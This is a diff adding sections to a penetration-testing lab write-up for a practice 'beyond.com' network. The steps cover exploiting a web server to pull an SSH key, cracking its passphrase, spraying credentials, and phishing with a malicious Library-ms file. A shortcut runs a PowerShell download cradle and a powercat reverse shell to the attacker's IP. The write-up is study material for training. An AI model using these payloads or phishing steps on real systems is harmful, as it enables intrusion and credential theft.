@@ -245,13 +245,280 @@ Shellcodes: No Results
 
 ### Initial Foothold
 
+Examining an exploit found via searchsploit:
+
+{% code overflow="wrap" %}
+```bash
+kali@kali:~/beyond$ searchsploit -x 50420
+```
+{% endcode %}
+
+Using the exploit to get **daniela**'s private ssh key:
+
+{% code overflow="wrap" %}
+```bash
+kali@kali:~/beyond/websrv1$ python3 50420.py http://192.168.50.244 /home/daniela/.ssh/id_rsa
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABBAElTUsf
+3CytILJX83Yd9rAAAAEAAAAAEAAAGXAAAAB3NzaC1yc2EAAAADAQABAAABgQDwl5IEgynx
+KMLz7p6mzgvTquG5/NT749sMGn+sq7VxLuF5zPK9sh//lVSxf6pQYNhrX36FUeCpu/bOHr
+tn+4AZJEkpHq8g21ViHu62IfOWXtZZ1g+9uKTgm5MTR4M8bp4QX+T1R7TzTJsJnMhAdhm1
+...
+UoRUBJIeKEdUlvbjNuXE26AwzrITwrQRlwZP5WY+UwHgM2rx1SFmCHmbcfbD8j9YrYgUAu
+vJbdmDQSd7+WQ2RuTDhK2LWCO3YbtOd6p84fKpOfFQeBLmmSKTKSOddcSTpIRSu7RCMvqw
+l+pUiIuSNB2JrMzRAirldv6FODOlbtO6P/iwAO4UbNCTkyRkeOAz1DiNLEHfAZrlPbRHpm
+QduOTpMIvVMIJcfeYF1GJ4ggUG4=
+-----END OPENSSH PRIVATE KEY-----
+
+```
+{% endcode %}
+
+Making the private key usable and finding it has a passphrase:
+
+{% code overflow="wrap" %}
+```bash
+kali@kali:~/beyond/websrv1$ chmod 600 id_rsa
+
+kali@kali:~/beyond/websrv1$ ssh -i id_rsa daniela@192.168.50.244
+Enter passphrase for key 'id_rsa': 
+```
+{% endcode %}
+
+
+
+Cracking the passphrase on the private key:
+
+{% code overflow="wrap" %}
+```bash
+kali@kali:~/beyond/websrv1$ ssh2john id_rsa > ssh.hash
+
+kali@kali:~/beyond/websrv1$ john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash
+...
+tequieromucho    (id_rsa) 
+...
+```
+{% endcode %}
+
+Using the private key with the cracked passphrase:
+
+{% code overflow="wrap" %}
+```bash
+kali@kali:~/beyond/websrv1$ ssh -i id_rsa daniela@192.168.50.244
+Enter passphrase for key 'id_rsa': 
+
+Welcome to Ubuntu 22.04.1 LTS (GNU/Linux 5.15.0-48-generic x86_64)
+...
+daniela@websrv1:~$ 
+```
+{% endcode %}
+
 ### A Link to the Past
+
+1. _Host linpeas.sh via `python3 -m http.server 80`_
+2. _Transfer to websrv1_
+3. _Run linpeas.sh_
+4. _Decide on path of attack. In our case we abuse being able to execute `git` with sudo, without a password._
+5. _Check out the git history via `git log` then display the differences with `git show` to avoid disrupting the client's web server._
 
 ## Gaining Access to the Internal Network
 
 ### Domain Credentials
 
+Using crackmapexec with the credentials we've discovered so far:
+
+{% code overflow="wrap" %}
+```bash
+kali@kali:~/beyond$ crackmapexec smb 192.168.50.242 -u usernames.txt -p passwords.txt --continue-on-success
+SMB         192.168.50.242  445    MAILSRV1         [*] Windows 10.0 Build 20348 x64 (name:MAILSRV1) (domain:beyond.com) (signing:False) (SMBv1:False)
+SMB         192.168.50.242  445    MAILSRV1         [-] beyond.com\marcus:tequieromucho STATUS_LOGON_FAILURE 
+SMB         192.168.50.242  445    MAILSRV1         [-] beyond.com\marcus:DanielKeyboard3311 STATUS_LOGON_FAILURE 
+SMB         192.168.50.242  445    MAILSRV1         [-] beyond.com\marcus:dqsTwTpZPn#nL STATUS_LOGON_FAILURE 
+SMB         192.168.50.242  445    MAILSRV1         [-] beyond.com\john:tequieromucho STATUS_LOGON_FAILURE 
+SMB         192.168.50.242  445    MAILSRV1         [-] beyond.com\john:DanielKeyboard3311 STATUS_LOGON_FAILURE 
+SMB         192.168.50.242  445    MAILSRV1         [+] beyond.com\john:dqsTwTpZPn#nL
+SMB         192.168.50.242  445    MAILSRV1         [-] beyond.com\daniela:tequieromucho STATUS_LOGON_FAILURE 
+SMB         192.168.50.242  445    MAILSRV1         [-] beyond.com\daniela:DanielKeyboard3311 STATUS_LOGON_FAILURE 
+SMB         192.168.50.242  445    MAILSRV1         [-] beyond.com\daniela:dqsTwTpZPn#nL STATUS_LOGON_FAILURE 
+```
+{% endcode %}
+
+This shows that john has valid credentials to MAILSRV1, we've identified the domain name as **beyond.com** and reviewing nmap shows there likely aren't any services we can utilize our validated credentials on.
+
+This leave us with two options:\
+1\. Further enumerate SMB on MAILSRV1, checking for sensitive data on accessible shares.\
+2\. Prepare a malicious attachment and send a phishing email as _john_ to _daniela_ and _marcus_.
+
+Using **crackmapexec** to list SMB shares:
+
+{% code overflow="wrap" %}
+```bash
+kali@kali:~/beyond$ crackmapexec smb 192.168.50.242 -u john -p "dqsTwTpZPn#nL" --shares  
+SMB         192.168.50.242  445    MAILSRV1         [*] Windows 10.0 Build 20348 x64 (name:MAILSRV1) (domain:beyond.com) (signing:False) (SMBv1:False)
+SMB         192.168.50.242  445    MAILSRV1         [+] beyond.com\john:dqsTwTpZPn#nL 
+SMB         192.168.50.242  445    MAILSRV1         [+] Enumerated shares
+SMB         192.168.50.242  445    MAILSRV1         Share           Permissions     Remark
+SMB         192.168.50.242  445    MAILSRV1         -----           -----------     ------
+SMB         192.168.50.242  445    MAILSRV1         ADMIN$                          Remote Admin
+SMB         192.168.50.242  445    MAILSRV1         C$                              Default share
+SMB         192.168.50.242  445    MAILSRV1         IPC$            READ            Remote IPC
+```
+{% endcode %}
+
+No dice, time to do some phishing.
+
 ### Phishing for Access
+
+Prepping the WebDAV share:
+
+{% code overflow="wrap" %}
+```bash
+kali@kali:~$ mkdir /home/kali/beyond/webdav
+
+kali@kali:~$ /home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/beyond/webdav/
+Running without configuration file.
+04:47:04.860 - WARNING : App wsgidav.mw.cors.Cors(None).is_disabled() returned True: skipping.
+04:47:04.861 - INFO    : WsgiDAV/4.0.2 Python/3.10.7 Linux-5.18.0-kali7-amd64-x86_64-with-glibc2.34
+04:47:04.861 - INFO    : Lock manager:      LockManager(LockStorageDict)
+04:47:04.861 - INFO    : Property manager:  None
+04:47:04.861 - INFO    : Domain controller: SimpleDomainController()
+04:47:04.861 - INFO    : Registered DAV providers by route:
+04:47:04.861 - INFO    :   - '/:dir_browser': FilesystemProvider for path '/home/kali/.local/lib/python3.10/site-packages/wsgidav/dir_browser/htdocs' (Read-Only) (anonymous)
+04:47:04.861 - INFO    :   - '/': FilesystemProvider for path '/home/kali/beyond/webdav' (Read-Write) (anonymous)
+04:47:04.861 - WARNING : Basic authentication is enabled: It is highly recommended to enable SSL.
+04:47:04.861 - WARNING : Share '/' will allow anonymous write access.
+04:47:04.861 - WARNING : Share '/:dir_browser' will allow anonymous read access.
+04:47:05.149 - INFO    : Running WsgiDAV/4.0.2 Cheroot/8.6.0 Python 3.10.7
+04:47:05.149 - INFO    : Serving on http://0.0.0.0:80 ...
+```
+{% endcode %}
+
+Creating our malicious attachment:
+
+{% code title="config.Library-ms" overflow="wrap" %}
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
+<name>@windows.storage.dll,-34582</name>
+<version>6</version>
+<isLibraryPinned>true</isLibraryPinned>
+<iconReference>imageres.dll,-1003</iconReference>
+<templateInfo>
+<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
+</templateInfo>
+<searchConnectorDescriptionList>
+<searchConnectorDescription>
+<isDefaultSaveLocation>true</isDefaultSaveLocation>
+<isSupported>false</isSupported>
+<simpleLocation>
+<url>http://192.168.119.5</url>
+</simpleLocation>
+</searchConnectorDescription>
+</searchConnectorDescriptionList>
+</libraryDescription>
+```
+{% endcode %}
+
+Now let's make a shortcut to execute a reverse shell:
+
+{% code title="install.lnk" overflow="wrap" %}
+```powershell
+powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.5:8000/powercat.ps1'); powercat -c 192.168.119.5 -p 4444 -e powershell"
+```
+{% endcode %}
+
+Copying powercat to our current directory, hosting it via python as well as starting a netcat listener:
+
+{% code overflow="wrap" %}
+```bash
+kali@kali:~/beyond$ cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
+
+kali@kali:~/beyond$ python3 -m http.server 8000 &
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+
+kali@kali:~/beyond$ nc -nvlp 4444 & 
+listening on [any] 4444 ...
+```
+{% endcode %}
+
+Using _swaks_ to send the email:
+
+{% code overflow="wrap" %}
+```bash
+# Creating the body in body.txt
+kali@kali:~/beyond$ cat body.txt
+Hey!
+I checked WEBSRV1 and discovered that the previously used staging script still exists in the Git logs. I'll remove it for security reasons.
+
+On an unrelated note, please install the new security features on your workstation. For this, download the attached file, double-click on it, and execute the configuration shortcut within. Thanks!
+
+John
+
+# Now we are ready to build the swaks command to send the emails. We'll provide daniela@beyond.com and marcus@beyond.com as recipients of the email to -t, john@beyond.com as name on the email envelope (sender) to --from, and the Windows Library file to --attach. Next, we'll enter --suppress-data to summarize information regarding the SMTP transactions. For the email subject and body, we'll provide Subject: Staging Script to --header and body.txt to --body. In addition, we'll enter the IP address of MAILSRV1 for --server. Finally, we'll add -ap to enable password authentication.
+kali@kali:~/beyond$ sudo swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach @config.Library-ms --server 192.168.50.242 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap
+Username: john
+Password: dqsTwTpZPn#nL
+=== Trying 192.168.50.242:25...
+=== Connected to 192.168.50.242.
+<-  220 MAILSRV1 ESMTP
+ -> EHLO kali
+<-  250-MAILSRV1
+<-  250-SIZE 20480000
+<-  250-AUTH LOGIN
+<-  250 HELP
+ -> AUTH LOGIN
+<-  334 VXNlcm5hbWU6
+ -> am9obg==
+<-  334 UGFzc3dvcmQ6
+ -> ZHFzVHdUcFpQbiNuTA==
+<-  235 authenticated.
+ -> MAIL FROM:<john@beyond.com>
+<-  250 OK
+ -> RCPT TO:<marcus@beyond.com>
+<-  250 OK
+ -> DATA
+<-  354 OK, send.
+ -> 36 lines sent
+<-  250 Queued (1.088 seconds)
+ -> QUIT
+<-  221 goodbye
+=== Connection closed with remote host.
+```
+{% endcode %}
+
+Waiting a few moments...
+
+{% code overflow="wrap" %}
+```powershell
+listening on [any] 4444 ...
+connect to [192.168.119.5] from (UNKNOWN) [192.168.50.242] 64264
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows
+
+PS C:\Windows\System32\WindowsPowerShell\v1.0> whoami
+whoami
+beyond\marcus
+
+PS C:\Windows\System32\WindowsPowerShell\v1.0> hostname
+hostname
+CLIENTWK1
+
+PS C:\Windows\System32\WindowsPowerShell\v1.0> ipconfig
+ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet0:
+
+   Connection-specific DNS Suffix  . : 
+   IPv4 Address. . . . . . . . . . . : 172.16.6.243
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 172.16.6.254
+PS C:\Windows\System32\WindowsPowerShell\v1.0>
+```
+{% endcode %}
 
 ## Enumerating the Internal Network
 
